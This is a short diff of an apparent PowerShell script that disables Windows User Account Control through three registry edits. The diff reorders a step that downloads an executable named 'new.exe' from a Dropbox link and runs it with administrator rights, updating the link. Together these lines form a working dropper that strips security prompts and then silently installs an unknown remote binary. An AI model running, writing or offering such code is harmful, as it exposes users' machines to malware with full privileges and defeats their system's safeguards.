@@ -1,6 +1,7 @@
-Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/uu9ufmaf5v7tduxyd3dfr/new.exe?rlkey=4gwdluerss2tio31pmfl0d7d&dl=1" -OutFile "$env:USERPROFILE\Downloads\new.exe"
-Start-Process -FilePath "$env:USERPROFILE\Downloads\new.exe" -Verb RunAs
-
 reg.exe ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 reg.exe ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg.exe ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
+
+Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/uu9ufmaf5v7tdxuy3dfri/new.exe?rlkey=kbljbk50dfqli73qtra1ojvtz&st=mp0x47k5&dl=1" -OutFile "$env:USERPROFILE\Downloads\new.exe"
+Start-Process -FilePath "$env:USERPROFILE\Downloads\new.exe" -Verb RunAs
+
